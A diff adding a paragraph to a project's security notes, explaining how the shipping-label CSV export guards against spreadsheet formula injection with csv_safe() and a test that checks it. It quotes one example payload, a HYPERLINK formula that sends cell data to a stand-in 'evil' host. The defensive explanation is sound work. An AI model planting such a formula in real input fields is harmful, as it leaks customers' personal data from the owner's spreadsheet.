@@ -678,6 +678,19 @@ disabled button alone does not.
   acted on. Removing either check turns "someone can POST JSON at your server" into "someone can
   order free merchandise".
 
+- **`/api/labels.csv` neutralises spreadsheet formulas.** Every name and address line in that
+  export is typed by a customer at checkout, and the owner opens the file in Excel or Sheets and
+  uploads it to Pirate Ship. A cell beginning `=`, `+`, `-`, `@`, tab or CR is parsed as a
+  **formula** by every major spreadsheet, so a buyer named `=HYPERLINK("http://evil/?x="&A1,"hi")`
+  gets code running in the owner's spreadsheet with every other customer's name, address and email
+  in scope. `csv.writer` does not help — it quotes delimiters so the file *parses* correctly, but
+  the danger is in how it is *interpreted* afterwards. `csv_safe()` prefixes a leading trigger with
+  an apostrophe, which every spreadsheet reads as "the rest is text". A real address never starts
+  with one of those characters, so it only fires on input that was already malformed. Admin auth on
+  the endpoint limits who can *trigger* the export, not who can *plant* the payload — any buyer can.
+  **A new column added to that row must go through `csv_safe()`**; `tests/test_label_csv.py` reads
+  the source and fails if a `ship_to` field is written raw.
+
 **The pre-commit hook needs updating whenever a new secret file is introduced.** It is a fixed list
 of filenames, not a rule: `costs.json` was added to the repo and the hook happily committed it
 until the pattern was extended. Anything new that holds credentials or business data goes in
